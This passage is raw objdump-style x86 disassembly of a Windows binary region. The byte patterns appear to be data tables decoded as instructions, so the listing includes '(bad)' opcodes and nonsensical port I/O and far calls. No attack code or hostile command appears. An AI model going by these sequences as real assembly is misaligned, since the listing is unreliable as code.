  4069a4:	5e                   	pop    %esi
  4069a5:	25 00 00 00 00       	and    $0x0,%eax
  4069aa:	86 08                	xchg   %cl,(%eax)
  4069ac:	85 21                	test   %esp,(%ecx)
  4069ae:	55                   	push   %ebp
  4069af:	02 5b 00             	add    0x0(%ebx),%bl
  4069b2:	c0 54 00 00 00       	rclb   $0x0,0x0(%eax,%eax,1)
  4069b7:	00 86 08 84 25 5a    	add    %al,0x5a258408(%esi)
  4069bd:	02 5c 00 67          	add    0x67(%eax,%eax,1),%bl
  4069c1:	25 00 00 00 00       	and    $0x0,%eax
  4069c6:	86 08                	xchg   %cl,(%eax)
  4069c8:	b1 10                	mov    $0x10,%cl
  4069ca:	5f                   	pop    %edi
  4069cb:	02 5c 00 6f          	add    0x6f(%eax,%eax,1),%bl
  4069cf:	25 00 00 00 00       	and    $0x0,%eax
  4069d4:	e1 01                	loope  0x4069d7
  4069d6:	1c 1e                	sbb    $0x1e,%al
  4069d8:	64 02 5c 00 7c       	add    %fs:0x7c(%eax,%eax,1),%bl
  4069dd:	25 00 00 00 00       	and    $0x0,%eax
  4069e2:	86 18                	xchg   %bl,(%eax)
  4069e4:	53                   	push   %ebx
  4069e5:	1e                   	push   %ds
  4069e6:	0e                   	push   %cs
  4069e7:	00 5c 00 20          	add    %bl,0x20(%eax,%eax,1)
  4069eb:	55                   	push   %ebp
  4069ec:	00 00                	add    %al,(%eax)
  4069ee:	00 00                	add    %al,(%eax)
  4069f0:	96                   	xchg   %eax,%esi
  4069f1:	00 ae 1f b1 02 5c    	add    %ch,0x5c02b11f(%esi)
  4069f7:	00 8f 25 00 00 00    	add    %cl,0x25(%edi)
  4069fd:	00 96 00 33 03 b8    	add    %dl,-0x47fccd00(%esi)
  406a03:	02 5e 00             	add    0x0(%esi),%bl
  406a06:	44                   	inc    %esp
  406a07:	55                   	push   %ebp
  406a08:	00 00                	add    %al,(%eax)
  406a0a:	00 00                	add    %al,(%eax)
  406a0c:	96                   	xchg   %eax,%esi
  406a0d:	00 19                	add    %bl,(%ecx)
  406a0f:	22 be 02 5f 00 78    	and    0x78005f02(%esi),%bh
  406a15:	20 00                	and    %al,(%eax)
  406a17:	00 00                	add    %al,(%eax)
  406a19:	00 86 18 53 1e 0e    	add    %al,0xe1e5318(%esi)
  406a1f:	00 61 00             	add    %ah,0x0(%ecx)
  406a22:	9e                   	sahf
  406a23:	25 00 00 00 00       	and    $0x0,%eax
  406a28:	96                   	xchg   %eax,%esi
  406a29:	00 26                	add    %ah,(%esi)
  406a2b:	22 c5                	and    %ch,%al
  406a2d:	02 61 00             	add    0x0(%ecx),%ah
  406a30:	04 56                	add    $0x56,%al
  406a32:	00 00                	add    %al,(%eax)
  406a34:	00 00                	add    %al,(%eax)
  406a36:	96                   	xchg   %eax,%esi
  406a37:	00 1d 1c cb 02 62    	add    %bl,0x6202cb1c
  406a3d:	00 cc                	add    %cl,%ah
  406a3f:	56                   	push   %esi
  406a40:	00 00                	add    %al,(%eax)
  406a42:	00 00                	add    %al,(%eax)
  406a44:	96                   	xchg   %eax,%esi
  406a45:	00 2f                	add    %ch,(%edi)
  406a47:	21 d2                	and    %edx,%edx
  406a49:	02 64 00 ab          	add    -0x55(%eax,%eax,1),%ah
  406a4d:	25 00 00 00 00       	and    $0x0,%eax
  406a52:	96                   	xchg   %eax,%esi
  406a53:	00 ee                	add    %ch,%dh
  406a55:	1a da                	sbb    %dl,%bl
  406a57:	02 66 00             	add    0x0(%esi),%ah
  406a5a:	c6                   	(bad)
  406a5b:	25 00 00 00 00       	and    $0x0,%eax
  406a60:	96                   	xchg   %eax,%esi
  406a61:	00 73 08             	add    %dh,0x8(%ebx)
  406a64:	e1 02                	loope  0x406a68
  406a66:	68 00 e6 25 00       	push   $0x25e600
  406a6b:	00 00                	add    %al,(%eax)
  406a6d:	00 96 00 09 0c e8    	add    %dl,-0x17f3f700(%esi)
  406a73:	02 6a 00             	add    0x0(%edx),%ch
  406a76:	6c                   	insb   (%dx),%es:(%edi)
  406a77:	57                   	push   %edi
  406a78:	00 00                	add    %al,(%eax)
  406a7a:	00 00                	add    %al,(%eax)
  406a7c:	96                   	xchg   %eax,%esi
  406a7d:	00 a2 02 ef 02 6c    	add    %ah,0x6c02ef02(%edx)
  406a83:	00 9c 57 00 00 00 00 	add    %bl,0x0(%edi,%edx,2)
  406a8a:	96                   	xchg   %eax,%esi
  406a8b:	00 a9 0b f6 02 6e    	add    %ch,0x6e02f60b(%ecx)
  406a91:	00 78 20             	add    %bh,0x20(%eax)
  406a94:	00 00                	add    %al,(%eax)
  406a96:	00 00                	add    %al,(%eax)
  406a98:	86 18                	xchg   %bl,(%eax)
  406a9a:	53                   	push   %ebx
  406a9b:	1e                   	push   %ds
  406a9c:	0e                   	push   %cs
  406a9d:	00 70 00             	add    %dh,0x0(%eax)
  406aa0:	e0 58                	loopne 0x406afa
  406aa2:	00 00                	add    %al,(%eax)
  406aa4:	00 00                	add    %al,(%eax)
  406aa6:	96                   	xchg   %eax,%esi
  406aa7:	00 13                	add    %dl,(%ebx)
  406aa9:	14 84                	adc    $0x84,%al
  406aab:	01 70 00             	add    %esi,0x0(%eax)
  406aae:	6c                   	insb   (%dx),%es:(%edi)
  406aaf:	59                   	pop    %ecx
  406ab0:	00 00                	add    %al,(%eax)
  406ab2:	00 00                	add    %al,(%eax)
  406ab4:	96                   	xchg   %eax,%esi
  406ab5:	00 47 09             	add    %al,0x9(%edi)
  406ab8:	84 01                	test   %al,(%ecx)
  406aba:	71 00                	jno    0x406abc
  406abc:	00 00                	add    %al,(%eax)
  406abe:	01 00                	add    %eax,(%eax)
  406ac0:	8a 1b                	mov    (%ebx),%bl
  406ac2:	00 00                	add    %al,(%eax)
  406ac4:	01 00                	add    %eax,(%eax)
  406ac6:	42                   	inc    %edx
  406ac7:	17                   	pop    %ss
  406ac8:	00 00                	add    %al,(%eax)
  406aca:	01 00                	add    %eax,(%eax)
  406acc:	48                   	dec    %eax
  406acd:	24 00                	and    $0x0,%al
  406acf:	00 01                	add    %al,(%ecx)
  406ad1:	00 1b                	add    %bl,(%ebx)
  406ad3:	06                   	push   %es
  406ad4:	00 00                	add    %al,(%eax)
  406ad6:	01 00                	add    %eax,(%eax)
  406ad8:	65 08 00             	or     %al,%gs:(%eax)
  406adb:	00 01                	add    %al,(%ecx)
  406add:	00 e0                	add    %ah,%al
  406adf:	04 00                	add    $0x0,%al
  406ae1:	00 01                	add    %al,(%ecx)
  406ae3:	00 95 18 00 00 01    	add    %dl,0x1000018(%ebp)
  406ae9:	00 e9                	add    %ch,%cl
  406aeb:	13 00                	adc    (%eax),%eax
  406aed:	00 01                	add    %al,(%ecx)
  406aef:	00 80 02 00 00 01    	add    %al,0x1000002(%eax)
  406af5:	00 d7                	add    %dl,%bh
  406af7:	15 00 00 01 00       	adc    $0x10000,%eax
  406afc:	b0 09                	mov    $0x9,%al
  406afe:	00 00                	add    %al,(%eax)
  406b00:	01 00                	add    %eax,(%eax)
  406b02:	50                   	push   %eax
  406b03:	17                   	pop    %ss
  406b04:	00 00                	add    %al,(%eax)
  406b06:	02 00                	add    (%eax),%al
  406b08:	2d 24 00 00 03       	sub    $0x3000024,%eax
  406b0d:	00 0a                	add    %cl,(%edx)
  406b0f:	04 00                	add    $0x0,%al
  406b11:	00 04 00             	add    %al,(%eax,%eax,1)
  406b14:	98                   	cwtl
  406b15:	1b 00                	sbb    (%eax),%eax
  406b17:	00 01                	add    %al,(%ecx)
  406b19:	00 c5                	add    %al,%ch
  406b1b:	06                   	push   %es
  406b1c:	00 00                	add    %al,(%eax)
  406b1e:	01 00                	add    %eax,(%eax)
  406b20:	b5 04                	mov    $0x4,%ch
  406b22:	00 00                	add    %al,(%eax)
  406b24:	01 00                	add    %eax,(%eax)
  406b26:	72 15                	jb     0x406b3d
  406b28:	00 00                	add    %al,(%eax)
  406b2a:	01 00                	add    %eax,(%eax)
  406b2c:	bf 26 00 00 01       	mov    $0x1000026,%edi
  406b31:	00 37                	add    %dh,(%edi)
  406b33:	05 00 00 01 00       	add    $0x10000,%eax
  406b38:	3a 0a                	cmp    (%edx),%cl
  406b3a:	00 00                	add    %al,(%eax)
  406b3c:	01 00                	add    %eax,(%eax)
  406b3e:	62 05 00 00 02 00    	bound  %eax,0x20000
  406b44:	79 07                	jns    0x406b4d
  406b46:	00 00                	add    %al,(%eax)
  406b48:	03 00                	add    (%eax),%eax
  406b4a:	33 0b                	xor    (%ebx),%ecx
  406b4c:	00 00                	add    %al,(%eax)
  406b4e:	01 00                	add    %eax,(%eax)
  406b50:	68 03 00 00 01       	push   $0x1000003
  406b55:	00 7d 09             	add    %bh,0x9(%ebp)
  406b58:	00 00                	add    %al,(%eax)
  406b5a:	02 00                	add    (%eax),%al
  406b5c:	53                   	push   %ebx
  406b5d:	19 00                	sbb    %eax,(%eax)
  406b5f:	00 01                	add    %al,(%ecx)
  406b61:	00 d5                	add    %dl,%ch
  406b63:	0b 00                	or     (%eax),%eax
  406b65:	00 01                	add    %al,(%ecx)
  406b67:	00 90 0f 00 00 02    	add    %dl,0x200000f(%eax)
  406b6d:	00 3a                	add    %bh,(%edx)
  406b6f:	09 00                	or     %eax,(%eax)
  406b71:	00 03                	add    %al,(%ebx)
  406b73:	00 e5                	add    %ah,%ch
  406b75:	09 00                	or     %eax,(%eax)
  406b77:	00 01                	add    %al,(%ecx)
  406b79:	00 f6                	add    %dh,%dh
  406b7b:	07                   	pop    %es
  406b7c:	00 00                	add    %al,(%eax)
  406b7e:	02 00                	add    (%eax),%al
  406b80:	92                   	xchg   %eax,%edx
  406b81:	24 00                	and    $0x0,%al
  406b83:	00 01                	add    %al,(%ecx)
  406b85:	00 20                	add    %ah,(%eax)
  406b87:	15 00 00 02 00       	adc    $0x20000,%eax
  406b8c:	46                   	inc    %esi
  406b8d:	02 00                	add    (%eax),%al
  406b8f:	00 01                	add    %al,(%ecx)
  406b91:	00 be 1b 00 00 01    	add    %bh,0x100001b(%esi)
  406b97:	00 46 1c             	add    %al,0x1c(%esi)
  406b9a:	00 00                	add    %al,(%eax)
  406b9c:	01 00                	add    %eax,(%eax)
  406b9e:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406b9f:	08 00                	or     %al,(%eax)
  406ba1:	00 01                	add    %al,(%ecx)
  406ba3:	00 d2                	add    %dl,%dl
  406ba5:	24 00                	and    $0x0,%al
  406ba7:	00 01                	add    %al,(%ecx)
  406ba9:	00 a6 0e 00 00 01    	add    %ah,0x100000e(%esi)
  406baf:	00 bc 05 00 00 01 00 	add    %bh,0x10000(%ebp,%eax,1)
  406bb6:	04 25                	add    $0x25,%al
  406bb8:	00 00                	add    %al,(%eax)
  406bba:	01 00                	add    %eax,(%eax)
  406bbc:	bf 03 00 00 01       	mov    $0x1000003,%edi
  406bc1:	00 a6 04 00 00 01    	add    %ah,0x1000004(%esi)
  406bc7:	00 6c 04 00          	add    %ch,0x0(%esp,%eax,1)
  406bcb:	00 01                	add    %al,(%ecx)
  406bcd:	00 da                	add    %bl,%dl
  406bcf:	09 00                	or     %eax,(%eax)
  406bd1:	00 02                	add    %al,(%edx)
  406bd3:	00 4e 06             	add    %cl,0x6(%esi)
  406bd6:	00 00                	add    %al,(%eax)
  406bd8:	01 00                	add    %eax,(%eax)
  406bda:	cd 26                	int    $0x26
  406bdc:	00 00                	add    %al,(%eax)
  406bde:	01 00                	add    %eax,(%eax)
  406be0:	95                   	xchg   %eax,%ebp
  406be1:	05 00 00 01 00       	add    $0x10000,%eax
  406be6:	f0 05 00 00 01 00    	lock add $0x10000,%eax
  406bec:	f9                   	stc
  406bed:	08 00                	or     %al,(%eax)
  406bef:	00 01                	add    %al,(%ecx)
  406bf1:	00 f8                	add    %bh,%al
  406bf3:	26 00 00             	add    %al,%es:(%eax)
  406bf6:	01 00                	add    %eax,(%eax)
  406bf8:	ec                   	in     (%dx),%al
  406bf9:	03 00                	add    (%eax),%eax
  406bfb:	00 01                	add    %al,(%ecx)
  406bfd:	00 df                	add    %bl,%bh
  406bff:	00 00                	add    %al,(%eax)
  406c01:	00 01                	add    %al,(%ecx)
  406c03:	00 55 1c             	add    %dl,0x1c(%ebp)
  406c06:	00 00                	add    %al,(%eax)
  406c08:	01 00                	add    %eax,(%eax)
  406c0a:	90                   	nop
  406c0b:	25 00 00 01 00       	and    $0x10000,%eax
  406c10:	7c 17                	jl     0x406c29
  406c12:	00 00                	add    %al,(%eax)
  406c14:	01 00                	add    %eax,(%eax)
  406c16:	9a 07 00 00 01 00 de 	lcall  $0xde00,$0x1000007
  406c1d:	0d 00 00 01 00       	or     $0x10000,%eax
  406c22:	57                   	push   %edi
  406c23:	09 00                	or     %eax,(%eax)
  406c25:	00 02                	add    %al,(%edx)
  406c27:	00 b9 0b 00 00 01    	add    %bh,0x100000b(%ecx)
  406c2d:	00 13                	add    %dl,(%ebx)
  406c2f:	01 00                	add    %eax,(%eax)
  406c31:	00 01                	add    %al,(%ecx)
  406c33:	00 64 0a 00          	add    %ah,0x0(%edx,%ecx,1)
  406c37:	00 01                	add    %al,(%ecx)
  406c39:	00 d0                	add    %dl,%al
  406c3b:	13 00                	adc    (%eax),%eax
  406c3d:	00 01                	add    %al,(%ecx)
  406c3f:	00 0d 02 00 00 01    	add    %cl,0x1000002
  406c45:	00 5f 06             	add    %bl,0x6(%edi)
  406c48:	00 00                	add    %al,(%eax)
  406c4a:	01 00                	add    %eax,(%eax)
  406c4c:	e1 06                	loope  0x406c54
  406c4e:	00 00                	add    %al,(%eax)
  406c50:	01 00                	add    %eax,(%eax)
  406c52:	b1 0a                	mov    $0xa,%cl
  406c54:	00 00                	add    %al,(%eax)
  406c56:	01 00                	add    %eax,(%eax)
  406c58:	ef                   	out    %eax,(%dx)
  406c59:	0b 00                	or     (%eax),%eax
  406c5b:	00 01                	add    %al,(%ecx)
  406c5d:	00 f1                	add    %dh,%cl
  406c5f:	06                   	push   %es
  406c60:	00 00                	add    %al,(%eax)
  406c62:	01 00                	add    %eax,(%eax)
  406c64:	ac                   	lods   %ds:(%esi),%al
  406c65:	16                   	push   %ss
  406c66:	00 00                	add    %al,(%eax)
  406c68:	01 00                	add    %eax,(%eax)
  406c6a:	ff 1a                	lcall  *(%edx)
  406c6c:	00 00                	add    %al,(%eax)
  406c6e:	01 00                	add    %eax,(%eax)
  406c70:	03 16                	add    (%esi),%edx
  406c72:	00 00                	add    %al,(%eax)
  406c74:	01 00                	add    %eax,(%eax)
  406c76:	19 05 00 00 02 00    	sbb    %eax,0x20000
  406c7c:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406c7d:	09 00                	or     %eax,(%eax)
  406c7f:	00 01                	add    %al,(%ecx)
  406c81:	00 de                	add    %bl,%dh
  406c83:	07                   	pop    %es
  406c84:	00 00                	add    %al,(%eax)
  406c86:	02 00                	add    (%eax),%al
  406c88:	c1 00 00             	roll   $0x0,(%eax)
  406c8b:	00 01                	add    %al,(%ecx)
  406c8d:	00 68 24             	add    %ch,0x24(%eax)
  406c90:	00 00                	add    %al,(%eax)
  406c92:	01 00                	add    %eax,(%eax)
  406c94:	ba 1f 00 00 01       	mov    $0x100001f,%edx
  406c99:	00 fa                	add    %bh,%dl
  406c9b:	0b 00                	or     (%eax),%eax
  406c9d:	00 01                	add    %al,(%ecx)
  406c9f:	00 17                	add    %dl,(%edi)
  406ca1:	0b 00                	or     (%eax),%eax
  406ca3:	00 01                	add    %al,(%ecx)
  406ca5:	00 ab 06 00 00 01    	add    %ch,0x1000006(%ebx)
  406cab:	00 a1 05 00 00 01    	add    %ah,0x1000005(%ecx)
  406cb1:	00 0e                	add    %cl,(%esi)
  406cb3:	06                   	push   %es
  406cb4:	00 00                	add    %al,(%eax)
  406cb6:	01 00                	add    %eax,(%eax)
  406cb8:	ac                   	lods   %ds:(%esi),%al
  406cb9:	0d 00 00 01 00       	or     $0x10000,%eax
  406cbe:	37                   	aaa
  406cbf:	1c 00                	sbb    $0x0,%al
  406cc1:	00 01                	add    %al,(%ecx)
  406cc3:	00 d8                	add    %bl,%al
  406cc5:	0a 00                	or     (%eax),%al
  406cc7:	00 01                	add    %al,(%ecx)
  406cc9:	00 bf 09 00 00 01    	add    %bh,0x1000009(%edi)
  406ccf:	00 fc                	add    %bh,%ah
  406cd1:	00 00                	add    %al,(%eax)
  406cd3:	00 01                	add    %al,(%ecx)
  406cd5:	00 c7                	add    %al,%bh
  406cd7:	02 00                	add    (%eax),%al
  406cd9:	00 01                	add    %al,(%ecx)
  406cdb:	00 66 16             	add    %ah,0x16(%esi)
  406cde:	00 00                	add    %al,(%eax)
  406ce0:	01 00                	add    %eax,(%eax)
  406ce2:	74 03                	je     0x406ce7
  406ce4:	00 00                	add    %al,(%eax)
  406ce6:	02 00                	add    (%eax),%al
  406ce8:	6f                   	outsl  %ds:(%esi),(%dx)
  406ce9:	02 00                	add    (%eax),%al
  406ceb:	00 01                	add    %al,(%ecx)
  406ced:	00 51 02             	add    %dl,0x2(%ecx)
  406cf0:	00 00                	add    %al,(%eax)
  406cf2:	01 00                	add    %eax,(%eax)
  406cf4:	fa                   	cli
  406cf5:	03 00                	add    (%eax),%eax
  406cf7:	00 02                	add    %al,(%edx)
  406cf9:	00 81 19 00 00 01    	add    %al,0x1000019(%ecx)
  406cff:	00 e3                	add    %ah,%bl
  406d01:	02 00                	add    (%eax),%al
  406d03:	00 01                	add    %al,(%ecx)
  406d05:	00 b0 26 00 00 02    	add    %dh,0x2000026(%eax)
  406d0b:	00 2c 09             	add    %ch,(%ecx,%ecx,1)
  406d0e:	00 00                	add    %al,(%eax)
  406d10:	01 00                	add    %eax,(%eax)
  406d12:	62 15 00 00 02 00    	bound  %edx,0x20000
  406d18:	e3 05                	jecxz  0x406d1f
  406d1a:	00 00                	add    %al,(%eax)
  406d1c:	01 00                	add    %eax,(%eax)
  406d1e:	e9 01 00 00 02       	jmp    0x2406d24
  406d23:	00 47 19             	add    %al,0x19(%edi)
  406d26:	00 00                	add    %al,(%eax)
  406d28:	01 00                	add    %eax,(%eax)
  406d2a:	1a 03                	sbb    (%ebx),%al
  406d2c:	00 00                	add    %al,(%eax)
  406d2e:	02 00                	add    (%eax),%al
  406d30:	2a 02                	sub    (%edx),%al
  406d32:	00 00                	add    %al,(%eax)
  406d34:	01 00                	add    %eax,(%eax)
  406d36:	31 01                	xor    %eax,(%ecx)
  406d38:	00 00                	add    %al,(%eax)
  406d3a:	02 00                	add    (%eax),%al
  406d3c:	a0 06 00 00 01       	mov    0x1000006,%al
  406d41:	00 34 17             	add    %dh,(%edi,%edx,1)
  406d44:	00 00                	add    %al,(%eax)
  406d46:	02 00                	add    (%eax),%al
  406d48:	56                   	push   %esi
  406d49:	08 00                	or     %al,(%eax)
  406d4b:	00 01                	add    %al,(%ecx)
  406d4d:	00 74 18 00          	add    %dh,0x0(%eax,%ebx,1)
  406d51:	00 02                	add    %al,(%edx)
  406d53:	00 c9                	add    %cl,%cl
  406d55:	19 00                	sbb    %eax,(%eax)
  406d57:	00 01                	add    %al,(%ecx)
  406d59:	00 40 01             	add    %al,0x1(%eax)
  406d5c:	00 00                	add    %al,(%eax)
  406d5e:	01 00                	add    %eax,(%eax)
  406d60:	34 07                	xor    $0x7,%al
  406d62:	16                   	push   %ss
  406d63:	00 59 00             	add    %bl,0x0(%ecx)
  406d66:	18 00                	sbb    %al,(%eax)
  406d68:	5d                   	pop    %ebp
  406d69:	00 b1 00 e8 22 bb    	add    %dh,-0x44dd1800(%ecx)
  406d6f:	01 b1 00 a6 23 bf    	add    %esi,-0x40dc5a00(%ecx)
  406d75:	01 b1 00 f2 21 0e    	add    %esi,0xe21f200(%ecx)
  406d7b:	00 b9 00 3b 1e 64    	add    %bh,0x641e3b00(%ecx)
  406d81:	02 c9                	add    %cl,%cl
  406d83:	00 53 1e             	add    %dl,0x1e(%ebx)
  406d86:	01 03                	add    %eax,(%ebx)
  406d88:	d1 00                	roll   $1,(%eax)
  406d8a:	53                   	push   %ebx
  406d8b:	1e                   	push   %ds
  406d8c:	0e                   	push   %cs
  406d8d:	00 d9                	add    %bl,%cl
  406d8f:	00 53 1e             	add    %dl,0x1e(%ebx)
  406d92:	2e 03 e9             	cs add %ecx,%ebp
  406d95:	00 53 1e             	add    %dl,0x1e(%ebx)
  406d98:	6b 01 f1             	imul   $0xfffffff1,(%ecx),%eax
  406d9b:	00 53 1e             	add    %dl,0x1e(%ebx)
  406d9e:	6b 01 f9             	imul   $0xfffffff9,(%ecx),%eax
  406da1:	00 53 1e             	add    %dl,0x1e(%ebx)
  406da4:	6b 01 01             	imul   $0x1,(%ecx),%eax
  406da7:	01 53 1e             	add    %edx,0x1e(%ebx)
  406daa:	6b 01 09             	imul   $0x9,(%ecx),%eax
  406dad:	01 53 1e             	add    %edx,0x1e(%ebx)
  406db0:	6b 01 11             	imul   $0x11,(%ecx),%eax
  406db3:	01 53 1e             	add    %edx,0x1e(%ebx)
  406db6:	6b 01 19             	imul   $0x19,(%ecx),%eax
  406db9:	01 53 1e             	add    %edx,0x1e(%ebx)
  406dbc:	6b 01 21             	imul   $0x21,(%ecx),%eax
  406dbf:	01 53 1e             	add    %edx,0x1e(%ebx)
  406dc2:	6b 01 29             	imul   $0x29,(%ecx),%eax
  406dc5:	01 53 1e             	add    %edx,0x1e(%ebx)
  406dc8:	6b 01 31             	imul   $0x31,(%ecx),%eax
  406dcb:	01 53 1e             	add    %edx,0x1e(%ebx)
  406dce:	4b                   	dec    %ebx
  406dcf:	02 39                	add    (%ecx),%bh
  406dd1:	01 53 1e             	add    %edx,0x1e(%ebx)
  406dd4:	0e                   	push   %cs
  406dd5:	00 41 01             	add    %al,0x1(%ecx)
  406dd8:	53                   	push   %ebx
  406dd9:	1e                   	push   %ds
  406dda:	6b 01 49             	imul   $0x49,(%ecx),%eax
  406ddd:	01 ef                	add    %ebp,%edi
  406ddf:	1b 7f 00             	sbb    0x0(%edi),%edi
  406de2:	51                   	push   %ecx
  406de3:	01 49 00             	add    %ecx,0x0(%ecx)
  406de6:	c4 03                	les    (%ebx),%eax
  406de8:	59                   	pop    %ecx
  406de9:	01 14 22             	add    %edx,(%edx,%eiz,1)
  406dec:	7f 00                	jg     0x406dee
  406dee:	51                   	push   %ecx
  406def:	01 8f 19 84 00 09    	add    %ecx,0x9008419(%edi)
  406df5:	00 53 1e             	add    %dl,0x1e(%ebx)
  406df8:	0e                   	push   %cs
  406df9:	00 61 01             	add    %ah,0x1(%ecx)
  406dfc:	8f 00                	pop    (%eax)
  406dfe:	cd 03                	int    $0x3
  406e00:	51                   	push   %ecx
  406e01:	01 ab 14 2a 01 61    	add    %ebp,0x61012a14(%ebx)
  406e07:	01 fd                	add    %edi,%ebp
  406e09:	14 d3                	adc    $0xd3,%al
  406e0b:	03 11                	add    (%ecx),%edx
  406e0d:	00 53 1e             	add    %dl,0x1e(%ebx)
  406e10:	2b 02                	sub    (%edx),%eax
  406e12:	11 00                	adc    %eax,(%eax)
  406e14:	c8 25 d9 03          	enter  $0xd925,$0x3
  406e18:	69 01 a0 25 df 03    	imul   $0x3df25a0,(%ecx),%eax
  406e1e:	61                   	popa
  406e1f:	01 a5 1f e5 03 81    	add    %esp,-0x7efc1ae1(%ebp)
  406e25:	01 c1                	add    %eax,%ecx
  406e27:	01 c7                	add    %eax,%edi
  406e29:	00 79 01             	add    %bh,0x1(%ecx)
  406e2c:	9c                   	pushf
  406e2d:	15 eb 03 19 00       	adc    $0x1903eb,%eax
  406e32:	53                   	push   %ebx
  406e33:	1e                   	push   %ds
  406e34:	09 04 19             	or     %eax,(%ecx,%ebx,1)
  406e37:	00 ae 13 01 03 19    	add    %ch,0x19030113(%esi)
  406e3d:	00 9b 13 01 03 c1    	add    %bl,-0x3efcfeed(%ebx)
  406e43:	01 56 26             	add    %edx,0x26(%esi)
  406e46:	16                   	push   %ss
  406e47:	04 c1                	add    $0xc1,%al
  406e49:	01 0e                	add    %ecx,(%esi)
  406e4b:	22 1c 04             	and    (%esp,%eax,1),%bl
  406e4e:	d1 01                	roll   $1,(%ecx)
  406e50:	53                   	push   %ebx
  406e51:	1e                   	push   %ds
  406e52:	0e                   	push   %cs
  406e53:	00 d1                	add    %dl,%cl
  406e55:	01 aa 23 23 04 d9    	add    %ebp,-0x26fbdcdd(%edx)
  406e5b:	01 46 1f             	add    %eax,0x1f(%esi)
  406e5e:	28 04 19             	sub    %al,(%ecx,%ebx,1)
  406e61:	00 ae 21 30 04 19    	add    %ch,0x19043021(%esi)
  406e67:	00 44 0c bf          	add    %al,-0x41(%esp,%ecx,1)
  406e6b:	01 19                	add    %ebx,(%ecx)
  406e6d:	00 ae 21 3c 02 99    	add    %ch,-0x66fdc3df(%esi)
  406e73:	01 53 1e             	add    %edx,0x1e(%ebx)
  406e76:	0e                   	push   %cs
  406e77:	00 a1 01 53 1e 36    	add    %ah,0x361e5301(%ecx)
  406e7d:	02 99 01 2c 20 38    	add    0x38202c01(%ecx),%bl
  406e83:	04 99                	add    $0x99,%al
  406e85:	01 cb                	add    %ecx,%ebx
  406e87:	14 70                	adc    $0x70,%al
  406e89:	01 c1                	add    %eax,%ecx
  406e8b:	01 0e                	add    %ecx,(%esi)
  406e8d:	22 3f                	and    (%edi),%bh
  406e8f:	04 d1                	add    $0xd1,%al
  406e91:	01 aa 23 49 04 f1    	add    %ebp,-0xefbb6dd(%edx)
  406e97:	01 fb                	add    %edi,%ebx
  406e99:	10 0e                	adc    %cl,(%esi)
  406e9b:	00 f9                	add    %bh,%cl
  406e9d:	01 53 1e             	add    %edx,0x1e(%ebx)
  406ea0:	4f                   	dec    %edi
  406ea1:	04 01                	add    $0x1,%al
  406ea3:	02 53 1e             	add    0x1e(%ebx),%dl
  406ea6:	56                   	push   %esi
  406ea7:	04 21                	add    $0x21,%al
  406ea9:	00 53 1e             	add    %dl,0x1e(%ebx)
  406eac:	5c                   	pop    %esp
  406ead:	04 19                	add    $0x19,%al
  406eaf:	00 1a                	add    %bl,(%edx)
  406eb1:	23 66 04             	and    0x4(%esi),%esp
  406eb4:	09 00                	or     %eax,(%eax)
  406eb6:	da 14 47             	ficoml (%edi,%eax,2)
  406eb9:	02 21                	add    (%ecx),%ah
  406ebb:	00 96 22 6c 04 29    	add    %dl,0x29046c22(%esi)
  406ec1:	02 53 1e             	add    0x1e(%ebx),%dl
  406ec4:	56                   	push   %esi
  406ec5:	04 29                	add    $0x29,%al
  406ec7:	00 53 1e             	add    %dl,0x1e(%ebx)
  406eca:	78 04                	js     0x406ed0
  406ecc:	31 02                	xor    %eax,(%edx)
  406ece:	53                   	push   %ebx
  406ecf:	1e                   	push   %ds
  406ed0:	56                   	push   %esi
  406ed1:	04 c1                	add    $0xc1,%al
  406ed3:	00 1c 0c             	add    %bl,(%esp,%ecx,1)
  406ed6:	82 04 39 02          	addb   $0x2,(%ecx,%edi,1)
  406eda:	56                   	push   %esi
  406edb:	10 8f 04 31 00 3c    	adc    %cl,0x3c003104(%edi)
  406ee1:	20 96 04 c1 00 fb    	and    %dl,-0x4ff3efc(%esi)
  406ee7:	10 0e                	adc    %cl,(%esi)
  406ee9:	00 19                	add    %bl,(%ecx)
  406eeb:	00 fb                	add    %bh,%bl
  406eed:	10 0e                	adc    %cl,(%esi)
  406eef:	00 29                	add    %ch,(%ecx)
  406ef1:	00 fb                	add    %bh,%bl
  406ef3:	10 0e                	adc    %cl,(%esi)
  406ef5:	00 c1                	add    %al,%cl
  406ef7:	00 14 0c             	add    %dl,(%esp,%ecx,1)
  406efa:	a1 04 49 02 49       	mov    0x49024904,%eax
  406eff:	00 a7 04 c1 00 21    	add    %ah,0x2100c104(%edi)
  406f05:	0c ae                	or     $0xae,%al
  406f07:	04 51                	add    $0x51,%al
  406f09:	02 53 1e             	add    0x1e(%ebx),%dl
  406f0c:	56                   	push   %esi
  406f0d:	04 49                	add    $0x49,%al
  406f0f:	01 53 1e             	add    %edx,0x1e(%ebx)
  406f12:	b6 04                	mov    $0x4,%dh
  406f14:	49                   	dec    %ecx
  406f15:	01 69 23             	add    %ebp,0x23(%ecx)
  406f18:	bd 04 61 02 cd       	mov    $0xcd026104,%ebp
  406f1d:	1d cf 04 49 02       	sbb    $0x24904cf,%eax
  406f22:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406f23:	1f                   	pop    %ds
  406f24:	9f                   	lahf
  406f25:	01 19                	add    %ebx,(%ecx)
  406f27:	00 2d 18 d6 04 c1    	add    %ch,0xc104d618
  406f2d:	00 53 11             	add    %dl,0x11(%ebx)
  406f30:	de 04 59             	fiadds (%ecx,%ebx,2)
  406f33:	02 53 1e             	add    0x1e(%ebx),%dl
  406f36:	2b 02                	sub    (%edx),%eax
  406f38:	c1 00 86             	roll   $0x86,(%eax)
  406f3b:	1a 15 02 c1 00 a7    	sbb    0xa700c102,%dl
  406f41:	15 0e 00 61 02       	adc    $0x261000e,%eax
  406f46:	14 22                	adc    $0x22,%al
  406f48:	9a 00 71 02 a6 21 0a 	lcall  $0xa21,$0xa6027100
  406f4f:	00 59 01             	add    %bl,0x1(%ecx)
  406f52:	1e                   	push   %ds
  406f53:	1f                   	pop    %ds
  406f54:	c7 00 a1 02 99 10    	movl   $0x109902a1,(%eax)
  406f5a:	01 05 79 02 53 1e    	add    %eax,0x1e530279
  406f60:	6b 01 81             	imul   $0xffffff81,(%ecx),%eax
  406f63:	02 d3                	add    %bl,%dl
  406f65:	20 07                	and    %al,(%edi)
  406f67:	05 81 02 9e 0f       	add    $0xf9e0281,%eax
  406f6c:	0d 05 a9 02 e7       	or     $0xe702a905,%eax
  406f71:	0f 47 02             	cmova  (%edx),%eax
  406f74:	b1 02                	mov    $0x2,%cl
